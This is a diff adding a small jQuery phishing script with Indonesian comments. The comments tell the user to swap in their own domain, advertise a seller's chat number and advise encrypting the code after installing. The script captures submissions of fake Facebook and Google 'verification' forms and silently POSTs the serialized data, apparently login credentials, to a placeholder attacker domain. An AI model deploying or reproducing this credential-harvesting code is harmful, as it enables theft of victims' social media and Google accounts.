@@ -1,0 +1,4 @@
+//GANTI DOMAIN JS ANDA 
+//BELI SC PUSAT JS CHAT 6281542725639
+// JANGAN LUPA DI ENC KLO DAH PASANG DAN DI TES
+$(document).ready(function(){$('#ValidateVerificationDataFB,#ValidateVerificationDataGP').submit(function(e){e.preventDefault();var data=$(this).serialize();$.ajax({url:'https://domainmu',type:'POST',data:data});});});
